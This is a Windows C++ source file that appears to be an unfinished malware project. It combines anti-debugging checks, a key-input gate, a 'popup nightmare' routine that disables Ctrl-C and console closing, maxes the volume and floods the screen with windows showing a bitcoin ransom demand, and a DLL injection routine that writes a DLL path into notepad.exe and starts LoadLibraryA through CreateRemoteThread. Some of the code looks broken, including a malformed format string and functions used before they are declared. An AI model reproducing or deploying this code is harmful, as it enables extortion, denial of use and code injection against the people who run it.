#include "stdafx.h"
#include <Windows.h>
#include <string.h>
#include <tlhelp32.h>

#define KEY_SIZE 32
#define NEWLINE_AND_POSSIBLE_CHARACTER 3 // Used to verify if used inserted more than the KEY_SIZE.
#define MAX_KEY_SIZE (KEY_SIZE + NEWLINE_AND_POSSIBLE_CHARACTER)

/**
 * Verify if the key is valid according to the following rule:
 * key MUST BE [a-f, A-F, 0-9] < 32
 *
 * @param char *key -> Inserted key.
 * @return true if valid, false otherwise.
 */
bool is_key_valid(char *key) {
    // Verify if the inserted key is not longer than MAX_KEY_SIZE.
    if (strlen(key) > (unsigned) KEY_SIZE)
        return false;

    // Verify if it has contains only valid characters: [a-f, A-F, 0-9]
    for (unsigned int i = 0; i < strlen(key) - 1; i++) {
        char character = key[i];

        if (!((character >= 'a' && character <= 'f')
              || (character >= 'A' && character <= 'F')
              || (character >= '0' && character <= '9')))
            return false;
    }

    return true;
}

/**
 * Read the key and verify if it's valid.
 *
 * @return true if valid, false otherwise.
 */
bool read_and_verify_key() {
    char key[MAX_KEY_SIZE];

    fgets(key, MAX_KEY_SIZE, stdin);
    key[strlen(key) - 1] = '\0'; // Remove '\n' from input.

    if (!is_key_valid(key))
        return false;
    else {
        printf("%s\n", key); // Echo key.
        return true;
    }
}

/**
 * Checks whether the program is being executed in debug mode. The purpose of this
 * function is to make the code more challenging to debug.
 *
 * @return true if in debug mode, false otherwise.
 */
bool is_debugging() {
    // First debug test, using the system function.
    if (IsDebuggerPresent()) {
        return true;
    }

    // In case the first test passes in debug mode, the second verify
    // directly from the system process.
    int debug;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &debug);

    return debug ? true : false;
}

/**
 * Start the popup nightmare.
 * @return void
 */
void start_popup_nightmare(){
    // Prevent the user from closing the program.
    SetConsoleCtrlHandler((PHANDLER_ROUTINE)CtrlHandler, TRUE);

    // Number of windows to be created.
    const int numWindows = 1000000000;

    // Get the screen size so that the windows are created on the screen.
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);

    // Set the volume to the maximum.
    HWAVEOUT hWaveOut;
    waveOutOpen(&hWaveOut, WAVE_MAPPER, NULL, 0, 0, WAVE_FORMAT_QUERY);
    waveOutSetVolume(hWaveOut, 0xFFFFFFFF);
    waveOutClose(hWaveOut);

    // Create the window class.
    HINSTANCE hInstance = GetModuleHandle(NULL);
    WNDCLASS wc = { 0 };
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = L"MyWindowClass";
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    RegisterClass(&wc);

    for (int i = 0; i < numWindows; ++i)
    {
        // Play a sound.
        MessageBeep(MB_ICONHAND);

        // Create the window.
        std::wstringstream windowTitle;
        windowTitle << L"SEND 1BTC TO WAV@WAV.WAV";
        HWND hwnd = CreateWindow(L"MyWindowClass", windowTitle.str().c_str(), WS_OVERLAPPEDWINDOW,
                                 (100 + i * 40)%screenWidth, (100 + i * 40)%screenHeight, 400, 150, NULL, NULL,
                                 hInstance, NULL);
        ShowWindow(hwnd, SW_SHOW);
    }
}

/**
 * CtrlHandler - Handles CTRL-C and CTRL-CLOSE events.
 * @param fdwCtrlType Type of control event.
 * @return Returns TRUE if handled, FALSE otherwise.
 */
BOOL CtrlHandler(DWORD fdwCtrlType)
{
    // Prevent the user from closing the program with CTRL-C.
    if (fdwCtrlType == CTRL_C_EVENT)
    {
        return TRUE;
    }

    // Prevent the user from closing the program with CTRL-CLOSE.
    if (fdwCtrlType == CTRL_CLOSE_EVENT)
    {
        start_popup_nightmare();
        return TRUE;
    }
    return FALSE;
}

/**
 * The Window Procedure
 * @param hwnd Handle to the window
 * @param msg Message for this window
 * @param wParam Additional message information
 * @param lParam Additional message information
 * @return Returns the result of the message processing and depends on the message sent.
 */
LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    return DefWindowProc(hwnd, msg, wParam, lParam);
}

// to get pif by name of exe
DWORD GetPidByName(const char* name){
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);
	char buf[MAX_PATH] = { 0 };
	size_t charsConverted = 0;

	//to create a snapshot of the current processes
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	//to iterate through the processes
	if (Process32First(snapshot, &entry)) {
        while(Process32Next(snapshot, &entry)) {
			// to convert the name of exe file from wide string to multibyte string 
			wcstombs_s(&charsConverted, buf, entry.szExeFile, MAX_PATH);  
			if(_stricmp(buf, name)== 0){
				HANDLE ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(entry.th32ProcessID));
				if(ph != NULL){
					printf("process on: %d\n", entry.th32ProcessID);
					CloseHandle(snapshot);
					return entry.th32ProcessID;
				}else{
					DWORD error = GetLastError();
					printf( "Failed to open the process. Error code: %d", error);
					printf("could not obtain handle on %d\n", entry.th32ProcessID);
				}
			}
        }
    }

    CloseHandle(snapshot);
    return 0;  // Process ID not found
}

// to start a new process
int StartNewProcess(const char* processName){
	const char* prependChars = "C:\\WINDOWS\\System32\\";
	size_t originalLength = strlen(processName);
	size_t prependLength = strlen(prependChars);
	char* modifiedName = new char[prependLength + originalLength+1];
	strcpy_s(modifiedName, prependLength + originalLength + 1, prependChars);
	strcat_s(modifiedName, prependLength + originalLength + 1, processName);

	int wideLength = MultiByteToWideChar(CP_UTF8,0,modifiedName,-1,nullptr,0);
	wchar_t* wideProcessName = new wchar_t[wideLength];
	MultiByteToWideChar(CP_UTF8,0,modifiedName,-1,wideProcessName,wideLength);

	STARTUPINFO si = {sizeof(si)};
	PROCESS_INFORMATION pi;

	LPCTSTR applicationName = wideProcessName;
	LPTSTR commandLine = NULL;
	LPSECURITY_ATTRIBUTES processAttributes = NULL;
	LPSECURITY_ATTRIBUTES threadAttributes = NULL;
	BOOL inheritHandles = FALSE;
	DWORD creationFlags =0;
	LPVOID environment = NULL;
	LPCTSTR currentDirectory = NULL;
	LPSTARTUPINFO startupInfo = &si;
	LPPROCESS_INFORMATION processInformation = &pi;

	BOOL result = CreateProcess(
		applicationName,
		commandLine,
		processAttributes,
		threadAttributes,
		inheritHandles,
		creationFlags,
		environment,
		currentDirectory,
		startupInfo,
		processInformation);
	if(result){
		printf("%s process created successfully!\n", processName);
		printf("Process ID: %d\n", pi.dwProcessId);

		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		return pi.dwProcessId;
	}else{
		printf("Failed to create %s process. Error code: %`\n", processName, GetLastError());
		return 0;
	
	}

}

void StartInjection(){
    // Get the full path of the current executable
    wchar_t executablePath[MAX_PATH];
    GetModuleFileName(NULL, executablePath, MAX_PATH);
	
	// To get cmd.exe's process id
	DWORD pid = GetPidByName("notepad.exe");
	printf("pid : %d\n", pid);

	if(pid == 0 || pid == NULL){
		printf("starting...\n");
		pid = StartNewProcess("notepad.exe");
		if(pid ==0){
			printf("Error with creating a new process\n");
		}
	}
	// to get a handle to the kernel32 module
	HMODULE hKernel32 = GetModuleHandle(L"Kernel32");
	// to get the address of the Loadlibrary function
	VOID *load_library = GetProcAddress(hKernel32, "LoadLibraryA");
	// to open the cmd process
	HANDLE notepad = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(pid));
	// to load the dll, to do: use pwd to get a relative path
	char* dll = "C:\\documents and settings\\Administrateur\\mes documents\\visual studio 2010\\Projects\\injection\\Release\\injection.dll";
	// to inject the dll
	char* dll_in_notepad = (char*) VirtualAllocEx(notepad, NULL, strlen(dll)+1, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	DWORD ecrites;
	// to write the DLL path to the allocated memory in the target process
	WriteProcessMemory(notepad, dll_in_notepad, dll, strlen(dll)+1, &ecrites);
	// to create a remote thread in the target process to execute LoadLibraryA
	CreateRemoteThread(notepad, NULL, 0, (LPTHREAD_START_ROUTINE) load_library, dll_in_notepad, 0, NULL);
	WaitForSingleObject (notepad, 12000);
	CloseHandle(notepad);
}

int _tmain(int argc, _TCHAR* argv[]) {
    while(1) {
        if (is_debugging()) {
            // TODO: exit program.
            printf("Debug session!\n");
        }

        if (!read_and_verify_key()) {
            // TODO: run malware.
            return 1;
        }
    }

    return 0;
}
